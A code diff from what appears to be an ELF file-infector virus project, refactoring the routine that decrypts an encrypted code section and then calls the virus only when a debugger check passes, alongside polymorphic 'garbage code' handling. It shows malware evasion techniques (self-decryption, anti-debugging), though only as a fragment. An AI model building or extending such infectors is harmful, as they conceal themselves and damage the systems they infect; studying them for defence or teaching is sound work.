@@ -1,12 +1,11 @@
 #include <elf.h>
 #include "infect.h"
 #include "ft_lib.h"
-#include "remote.h"
+#include "hacks.h"
 #include "pos.h"
 #include "table.h"
 
 int __attribute__((section (".textearly"))) main(int ac, char **av) asm ("entry");
-int __attribute__((section (".textearly"))) decrypt();
 
 extern struct s_opt opt;
 
@@ -48,21 +47,13 @@ void change_garbage_code(){
 
 extern void decrypt_block_asm(uint32_t *v, uint32_t *k);
 
-int decrypt(){
-        char *s = ((char*)&crypt_start);
-        uint64_t n = ((size_t)&crypt_end) - ((size_t)&crypt_start);
-        for (uint64_t i = 0; i < n; i += 8){
-                if (i + 8 < n){
-                        decrypt_block_asm((uint32_t*)(s+i), (uint32_t*)key);
-                }
-        }
+int decryptHiddenCode(){
+	char *s = ((char*)&crypt_start);
+	uint64_t n = ((size_t)&crypt_end) - ((size_t)&crypt_start);
+
+	decrypt(s,n,(uint32_t*)key);
 	//decrypt test area
-	n = 15;
-	 for (uint64_t i = 0; i < n; i += 8){
-                if (i + 8 < n){
-                        decrypt_block_asm((uint32_t*)((char *)(&test_area) + i), (uint32_t*)key);
-                }
-        }
+	decrypt(&test_area,15,(uint32_t*)key);
 	//check test area
 	for (int i = 0; i < n; i++)
 		if ((&test_area)[i] != 'A')
@@ -107,7 +98,7 @@ int main(int ac, char **av){
 		return FALSE;
 	if (checkdebug() == 0)
 	{
-		return decrypt() && virus(ac, av);
+		return decryptHiddenCode() && virus(ac, av);
 	}
 	else
 		CALL(SYS_write, 1, "DEBUGGING..\n", 12);
